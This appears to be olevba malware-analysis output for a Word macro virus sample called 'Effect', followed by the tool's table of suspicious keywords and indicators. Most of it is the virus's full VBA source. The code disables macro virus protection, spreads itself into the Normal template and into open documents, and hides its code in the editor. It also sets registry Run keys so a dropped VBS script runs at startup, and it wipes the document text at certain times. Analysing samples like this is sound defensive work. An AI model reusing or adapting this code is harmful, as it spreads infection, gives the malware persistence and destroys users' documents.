olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Effect
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Effect - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ViewVBcode()
effect
End Sub
Sub ToolsMacro()
effect
End Sub
Sub AutoExit()
Options.VirusProtection = 1
End Sub
Sub AutoExec()
Options.VirusProtection = 0
End Sub
Sub ToolsOptions()
On Error Resume Next
Options.VirusProtection = 1
Options.SaveNormalPrompt = 1
If Dialogs(wdDialogToolsOptions).Show Then
End If
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
End Sub
Private Sub Document_Open()
On Error Resume Next
Application.ScreenUpdating = 0
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVPCC") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "AVPCC Service") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
ActiveDocument.ReadOnlyRecommended = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Then GoTo sgt Else GoTo uuu
sgt: atr = GetAttr(NormalTemplate.FullName)
If atr = 33 Then atr = 1
If atr = 1 Then GoTo nnn Else GoTo uuu
nnn: NormalTemplate.OpenAsDocument
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Close
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 1, "Sub ViewVBcode()"
.replaceline 4, "Sub ToolsMacro()"
.replaceline 7, "Sub AutoExit()"
.replaceline 10, "Sub AutoExec()"
.replaceline 13, "Sub ToolsOptions()"
End With
Call effect
ActiveDocument.Saved = True
End
uuu:
If ActiveDocument.ReadOnly = True Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
Norma = False
Document = False
ZY = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
VI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
If UCase(ZY) = "EFFECT" Then Norma = True
If UCase(VI) = "EFFECT" Then Document = True
If Norma = True And Document = True Then GoTo 1
If Norma = False Then
Set JI = NormalTemplate.VBProject.VBComponents(1).CodeModule
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 1, "Sub ViewVBcode()"
.replaceline 4, "Sub ToolsMacro()"
.replaceline 7, "Sub AutoExit()"
.replaceline 10, "Sub AutoExec()"
.replaceline 13, "Sub ToolsOptions()"
CI = .Lines(1, .CountOfLines)
End With
With JI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 1, "Private Sub code()"
.replaceline 4, "Private Sub macro()"
.replaceline 7, "Private Sub sss()"
.replaceline 10, "Private Sub ooo()"
.replaceline 13, "Private Sub zzz()"
CI = .Lines(1, .CountOfLines)
End With
End If
If Document = False Then
Set HI = ActiveDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 1, "Private Sub code()"
.replaceline 4, "Private Sub macro()"
.replaceline 7, "Private Sub sss()"
.replaceline 10, "Private Sub ooo()"
.replaceline 13, "Private Sub zzz()"
CI = .Lines(1, .CountOfLines)
End With
With HI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 1, "Sub ViewVBcode()"
.replaceline 4, "Sub ToolsMacro()"
.replaceline 7, "Sub AutoExit()"
.replaceline 10, "Sub AutoExec()"
.replaceline 13, "Sub ToolsOptions()"
End With
End If
1:
Z = Int((12 * Rnd) + 1)
If Month(Now()) = Z Then
Selection.HomeKey Unit:=wdStory
Selection.WholeStory
With Selection.Font
.Animation = wdAnimationSparkleText
End With
Selection.EndKey Unit:=wdStory
ActiveDocument.UndoClear
End If
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub effect()
On Error Resume Next
ZY = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
If UCase(ZY) = "EFFECT" Then Norma = True
If Norma = True Then GoTo ccc Else GoTo ggg
ccc: NormalTemplate.VBProject.VBComponents.Item(1).Export ("C:\WINDOWS\SYSTEM\effect.sys")
GoTo bbb
ggg: ActiveDocument.VBProject.VBComponents.Item(1).Export ("C:\WINDOWS\SYSTEM\effect.sys")
bbb: System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVPCC") = "C:\WINDOWS\SYSTEM\effect.vbs"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "AVPCC Service") = "C:\WINDOWS\SYSTEM\effect.vbs"
Open "C:\WINDOWS\SYSTEM\effect.vbs" For Output As #1
Print #1, "On Error Resume Next"
Print #1, "Set effect = WScript.CreateObject(""Word.Application"")"
Print #1, "effect.Options.VirusProtection = False"
Print #1, "effect.Options.SaveNormalPrompt = False"
Print #1, "For x = 1 To effect.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "effect.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "effect.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\effect.sys" & Chr(34) & ")"
Print #1, "effect.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4"
Print #1, "effect.NormalTemplate.Save"
Print #1, "effect.Application.Quit"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "WSHShell.RegDelete ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\AVPCC"""
Print #1, "WSHShell.RegDelete ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\AVPCC Service"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors"",""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors"",""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"""
Close #1
Set SS = NormalTemplate.VBProject.VBComponents(1).CodeModule
With SS
.DeleteLines 1, .CountOfLines
End With
Set ZZ = ActiveDocument.VBProject.VBComponents(1).CodeModule
With ZZ
.DeleteLines 1, .CountOfLines
End With
ActiveDocument.Saved = True
Application.Quit
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.Name = ActiveDocument.FullName Then
End
End If
If Hour(Now()) = 23 And Minute(Now()) >= 0 Then
Selection.HomeKey Unit:=wdStory
Selection.WholeStory
Selection.Delete Unit:=wdCharacter, Count:=1
Selection.TypeText Text:="Effect"
Selection.WholeStory
Selection.Font.Bold = wdToggle
Selection.Font.Size = 162
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
With Selection.Font
.Animation = wdAnimationSparkleText
End With
Selection.EndKey Unit:=wdStory
End If
Call Document_Open
End Sub

'   MMM            MMMMMMMMM                 MM
' MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
'  MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
'   MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
'   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'   MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'   MMM        MMMMMMMMMMMMM           MMMMMMMMMM
'   MMM        MMMMMMMMMMM               MMMMMMMM
'    MM         MMMMMMMM               M  MMMMMMM
'    MM        MMMMMMMMM             MMM   MMMMMM
'             MMMMMMMMMMMMMM      MMMMM    MMMMMM
'    MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
'   MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
'  MMMMMMMMMM                                MM
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |effect.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

